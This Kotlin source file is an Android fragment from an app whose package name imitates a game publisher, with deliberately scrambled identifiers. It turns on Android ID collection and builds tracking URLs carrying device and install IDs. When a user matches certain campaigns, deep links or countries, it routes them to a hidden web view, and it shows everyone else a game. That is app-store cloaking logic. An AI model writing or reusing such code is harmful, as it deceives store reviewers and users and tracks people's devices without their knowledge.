package com.artifexmundi.bale

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.artifexmundi.bale.cocococo.Util26255.yjuujuj
import com.artifexmundi.bale.cocococo.Util26255.hyjuujikikollool
import com.artifexmundi.bale.cocococo.Util26255.aps_idhyhy2hy
import com.artifexmundi.bale.cocococo.Util26255.h2yy5yyyy5y
import com.artifexmundi.bale.cocococo.Util26255.hyjjujujujuj
import com.artifexmundi.bale.cocococo.Util26255.instIdhyhy
import com.artifexmundi.bale.cocococo.Util26255.hhy2hy25u
import com.artifexmundi.bale.cocococo.Util26255.frgtgttggt
import com.artifexmundi.bale.cocococo.Util26255.h2y5hy5y55y
import com.artifexmundi.bale.cocococo.Util26255.nammhy2y6h
import com.artifexmundi.bale.cocococo.Util26255.cdvfttyyuu
import com.artifexmundi.bale.cocococo.Util26255.paaaackhyyh
import com.artifexmundi.bale.cocococo.Util26255.h2hy2hy62hy
import com.artifexmundi.bale.cocococo.Util26255.hyujujujuj
import com.artifexmundi.bale.cocococo.Util26255.jjujkiikikik
import com.artifexmundi.bale.cocococo.Util26255.h25u
import com.artifexmundi.bale.cocococo.Util26255.trololohy
import com.artifexmundi.bale.cocococo.Util26255.juujujkiikik
import com.artifexmundi.bale.activgaame.GymyActivity
import com.artifexmundi.bale.openurl.VivatActivity
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class F5Fragment : Fragment() {

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_f5, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val counthyhyhy = shareP.getString(hyjjujujujuj, null)

        val wvhyhyhy = shareP.getString(juujujkiikik, null)
        val mainIdhy2hy2hy = shareP.getString("mainId", null)
        val pack = paaaackhyyh
        val buildVers = Build.VERSION.RELEASE
        val appCamphyyhhyhy = shareP.getString("appCamp", null)
        val deepSthyyhhyhy = shareP.getString("deepSt", null)
        val countryDevhyhy2hy2hy = shareP.getString(h2yy5yyyy5y, null)
        val appshhyhyhy = shareP.getString(hyjuujikikollool, null)
        val g2h5yy5y5 = shareP.getString(h2y5hy5y55y, null)
        val gthyjujuuj5u8: String? = shareP.getString(instIdhyhy, null)

        Log.d("lolo", "${appshhyhyhy}")

        val h2y5hy5yh = Intent(activity, VivatActivity::class.java)
        val hy2ju5uj5ik5ii = Intent(activity, GymyActivity::class.java)

        val afIdhy2yh26yh62hy = AppsFlyerLib.getInstance().getAppsFlyerUID(mContext)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        shareP.edit().putString(aps_idhyhy2hy, afIdhy2yh26yh62hy).apply()

        val linkAppshyhyhy2yh2 = "$wvhyhyhy$jjujkiikikik$appCamphyyhhyhy&$cdvfttyyuu$afIdhy2yh26yh62hy&$yjuujuj$mainIdhy2hy2hy&$hyujujujuj$pack&$h2hy2hy62hy$buildVers&$h25u$nammhy2y6h"
        val linkMThyhyhy = "$wvhyhyhy$cdvfttyyuu$g2h5yy5y5&$yjuujuj$gthyjujuuj5u8&$hyujujujuj$pack&$h2hy2hy62hy$buildVers&$h25u$nammhy2y6h"
        val hy2hy5hy5hy5 = "$wvhyhyhy$jjujkiikikik$deepSthyyhhyhy&$cdvfttyyuu$afIdhy2yh26yh62hy&$yjuujuj$mainIdhy2hy2hy&$hyujujujuj$pack&$h2hy2hy62hy$buildVers&$h25u$trololohy"
        val linkFBNullAppsgthhy = "$wvhyhyhy$jjujkiikikik$deepSthyyhhyhy&$cdvfttyyuu$g2h5yy5y5&$yjuujuj$gthyjujuuj5u8&$hyujujujuj$pack&$h2hy2hy62hy$buildVers&$h25u$trololohy"

        when(appshhyhyhy) {
            "1" ->
                if(appCamphyyhhyhy!!.contains(hhy2hy25u)) {
                    shareP.edit().putString(frgtgttggt, linkAppshyhyhy2yh2).apply()
                    shareP.edit().putString("WebInt", "campaign").apply()
                    startActivity(h2y5hy5yh)
                    gtjgtitgjtgjgtijjigt()
                } else if (deepSthyyhhyhy!=null||countryDevhyhy2hy2hy!!.contains(counthyhyhy.toString())) {
                    shareP.edit().putString(frgtgttggt, hy2hy5hy5hy5).apply()
                    shareP.edit().putString("WebInt", "deepLink").apply()
                    startActivity(h2y5hy5yh)
                    gtjgtitgjtgjgtijjigt()
                } else {
                    startActivity(hy2ju5uj5ik5ii)
                    gtjgtitgjtgjgtijjigt()
                }
            "0" ->
                if(deepSthyyhhyhy!=null) {
                    shareP.edit().putString(frgtgttggt, linkFBNullAppsgthhy).apply()
                    shareP.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(h2y5hy5yh)
                    gtjgtitgjtgjgtijjigt()
                } else if (countryDevhyhy2hy2hy!!.contains(counthyhyhy.toString())) {
                    shareP.edit().putString(frgtgttggt, linkMThyhyhy).apply()
                    shareP.edit().putString("WebInt", "geo").apply()
                    startActivity(h2y5hy5yh)
                    gtjgtitgjtgjgtijjigt()
                } else {
                    startActivity(hy2ju5uj5ik5ii)
                    gtjgtitgjtgjgtijjigt()
                }
        }
    }

    private fun gtjgtitgjtgjgtijjigt() {
        activity?.finish()
    }

    private lateinit var mContext: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        mContext = context
    }
}